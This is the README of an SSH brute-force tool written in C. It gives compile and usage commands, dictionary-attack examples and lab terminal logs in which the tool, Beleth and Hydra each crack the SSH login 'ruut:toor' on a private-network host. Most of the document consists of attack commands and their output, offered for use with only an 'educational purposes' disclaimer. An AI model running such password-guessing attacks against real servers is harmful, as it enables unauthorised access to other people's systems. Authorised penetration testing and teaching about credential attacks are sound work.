# SSH Brute Forcer

A simple, multi-threaded SSH brute force tool designed for basic brute forcing and dictionary-based attacks.

## Features

- **Multi-Threading**:
  - Utilizes multiple threads to attempt concurrent connections, potentially increasing speed.
  - Be cautious: Creating an excessive number of threads (e.g., 1000) can overwhelm the system. This feature is primarily for demonstration purposes and should be used with care.

- **Standard Brute Forcing**:
  - Tests random strings of varying lengths, which is generally inefficient and not recommended for serious use.

- **Dictionary-Based Attacks**:
  - Supports using a list of passwords from a file for more targeted attacks.

## Compile

```
	$ cc -o ssh-brute-forcer ssh-brute-forcer.c -I/usr/local/include -L/usr/local/lib -lssh -pthread -Wno-discarded-qualifiers -Wno-incompatible-pointer-types-discards-qualifiers -Wno-unknown-warning-option
```

## Usage

```
$ ./ssh-brute-forcer -h <hostname> -p <port> [-u <username>] [-p <password> | -P <password_list>] [-t <thread_count>] [-V]
```
Parameters

    -h <hostname>: The SSH server’s hostname or IP address.
    -p <port>: The SSH port (default is 22).
    -u <username>: Specific username to test.
    -p <password>: Specific password to test.
    -P <password_list>: Path to a file with a list of passwords.
    -t <thread_count>: Number of threads for concurrent testing (default is 4).
    -V: Verbose mode to display attempted passwords.

Example Commands

    Test a Single Username and Password:

```
$ ./ssh-brute-forcer -h 192.168.1.142 -p 22 -u myuser -p mypassword -t 10 -V
```

This command tests the provided username and password using 10 threads and displays the attempted passwords.

Dictionary-Based Attack with a Username and Password List:

```
$ ./ssh-brute-forcer -h 192.168.1.142 -p 22 -u myuser -P pass.list -t 10 -V

```

    This command tests the specified username with all passwords from pass.list using 10 threads, showing attempted passwords.

Note

The brute force method of trying random strings is highly inefficient and not suitable for practical use. Additionally, using a large number of threads can significantly impact system performance and stability. This tool is intended primarily for educational purposes and should be used responsibly.

## Test
## ssh-brute-forcer

```
┌──(root㉿kali)-[~/code/ssh-brute-forcer]
└─# time ./ssh-brute-forcer -h 192.168.1.142 -p 777 -u ruut -P pass.list -t 10 -V
Attempting - Username: ruut, Password: sdf
Attempting - Username: ruut, Password: dg
Attempting - Username: ruut, Password: asd
Attempting - Username: ruut, Password: sdf
Attempting - Username: ruut, Password: asdfa
Attempting - Username: ruut, Password: asdfasdfsad
Attempting - Username: ruut, Password: sadf
Attempting - Username: ruut, Password: ga
Attempting - Username: ruut, Password: asdfg
Attempting - Username: ruut, Password: f
Attempting - Username: ruut, Password: dsf
Attempting - Username: ruut, Password: sad
Attempting - Username: ruut, Password: as
Attempting - Username: ruut, Password: f
Attempting - Username: ruut, Password: df
Attempting - Username: ruut, Password: asdasdf
Attempting - Username: ruut, Password: asd
Attempting - Username: ruut, Password: asdf
Attempting - Username: ruut, Password: fasdgafadf
Attempting - Username: ruut, Password: asdf
Attempting - Username: ruut, Password: toor
Credentials found - Username: ruut, Password: toor

real	1.58s
user	0.01s
sys	0.03s
cpu	2%
```

##beleth

```
┌──(root㉿kali)-[~/code/ssh-brute-forcer]
└─# time beleth -l 10 -t 192.168.1.142 -p 777 -w pass.list -u ruut -v
┌────────────────────────────────────────┐
│                 Beleth                 │
│          www.chokepoint.net            │
└────────────────────────────────────────┘
[*] Read 21 passwords from file.
[*] Starting task manager
[*] Spawning 10 threads
[*] Starting attack on ruut@192.168.1.142:777
[+] (1762) Trying ruut asdfa
[+] (1764) Trying ruut sdf
[+] (1771) Trying ruut asdfg
[+] (1763) Trying ruut dg
[+] (1766) Trying ruut f
[+] (1765) Trying ruut ga
[+] (1770) Trying ruut sdf
[+] (1767) Trying ruut asd
[+] (1768) Trying ruut asdfasdfsad
[+] (1769) Trying ruut sadf
[+] (1771) Trying ruut df
[+] (1766) Trying ruut as
[+] (1764) Trying ruut asd
[+] (1763) Trying ruut f
[+] (1767) Trying ruut asdf
[+] (1765) Trying ruut sad
[+] (1762) Trying ruut fasdgafadf
[+] (1770) Trying ruut asdf
[+] (1768) Trying ruut dsf
[+] (1769) Trying ruut asdasdf
[+] (1770) Trying ruut toor
[*] Cleaning up child processes.
[*] Authentication succeeded (ruut:toor@192.168.1.142:777)
[*] Executing: uname -a && id
[*] Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux
[*] uid=1002(ruut) gid=1002(ruut) groups=1002(ruut)
kt11-1+deb8u2 (2015-07-17) i686 GNU/Linux

real	1.45s
user	0.03s
sys	0.05s
cpu	5%
```

##hydra

```
┌──(root㉿kali)-[~/code/ssh-brute-forcer]
└─# time hydra -s 777 -l ruut -P pass.list  192.168.1.142 ssh -V     
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-25 17:41:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 21 login tries (l:1/p:21), ~2 tries per task
[DATA] attacking ssh://192.168.1.142:777/
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asdfa" - 1 of 21 [child 0] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "sdf" - 2 of 21 [child 1] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asdfg" - 3 of 21 [child 2] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "dg" - 4 of 21 [child 3] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "f" - 5 of 21 [child 4] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "ga" - 6 of 21 [child 5] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "sdf" - 7 of 21 [child 6] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asd" - 8 of 21 [child 7] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asdfasdfsad" - 9 of 21 [child 8] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "sadf" - 10 of 21 [child 9] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "as" - 11 of 21 [child 10] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "df" - 12 of 21 [child 11] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asd" - 13 of 21 [child 12] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "f" - 14 of 21 [child 13] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asdf" - 15 of 21 [child 14] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "sad" - 16 of 21 [child 15] (0/0)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "fasdgafadf" - 17 of 22 [child 3] (0/1)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asdf" - 18 of 22 [child 11] (0/1)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "dsf" - 19 of 22 [child 0] (0/1)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asdasdf" - 20 of 22 [child 1] (0/1)
[ATTEMPT] target 192.168.1.142 - login "ruut" - pass "toor" - 21 of 22 [child 2] (0/1)
[REDO-ATTEMPT] target 192.168.1.142 - login "ruut" - pass "asd" - 22 of 22 [child 4] (1/1)
[777][ssh] host: 192.168.1.142   login: ruut   password: toor
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-25 17:41:54

real	1.64s
user	0.05s
sys	0.03s
cpu	4%
```
